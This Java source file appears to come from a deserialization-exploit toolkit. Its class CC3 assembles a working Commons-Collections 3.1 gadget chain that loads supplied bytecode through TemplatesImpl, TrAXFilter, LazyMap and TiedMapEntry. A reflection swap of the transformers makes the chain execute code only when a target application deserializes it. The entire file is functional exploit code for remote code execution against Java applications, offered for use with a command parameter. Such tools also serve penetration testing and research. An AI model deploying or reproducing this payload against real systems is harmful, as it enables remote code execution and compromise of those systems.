package com.bcvgh.core.unser.gadgets.exec;

import com.bcvgh.core.unser.annotation.DependenciesVersion;
import com.bcvgh.core.unser.core.pojo.UnSerInput;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.bcvgh.core.unser.annotation.RequireParameter;
import com.bcvgh.core.unser.gadgets.CustomPayload;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import static com.bcvgh.core.unser.gadgets.util.Reflections.setFieldValue;

@DependenciesVersion("Commons-collections-3.1")
@RequireParameter("Command")
public class CC3 implements CustomPayload {
    @Override
    public <T> Object getObject(UnSerInput unSerInput) throws Exception {
        TemplatesImpl obj=new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{unSerInput.getBytecode()});
        setFieldValue(obj,"_name","HelloT");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
        Transformer[] fakeTransformers = new Transformer[] {new
                ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { obj })
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap=new HashMap();
        Map outerMap = LazyMap.decorate(innerMap,transformerChain);
        TiedMapEntry tme=new TiedMapEntry(outerMap,"keykey");
        Map expMap= new HashMap();
        expMap.put(tme,"valuevalue");
        innerMap.remove("keykey");
        Field f =
                ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);
        return expMap;
    }


//    public static byte[] getBytecode(final Class classname) throws NotFoundException, IOException, CannotCompileException {
//        ClassPool pool = ClassPool.getDefault();
//        CtClass clazz =
//                pool.get(classname.getName());
////        JavaClass cls = Repository.lookupClass(classname);
////        byte[] bytes = cls.getBytes();
//        byte[] bytes = clazz.toBytecode();
//        return bytes;
//    }
}
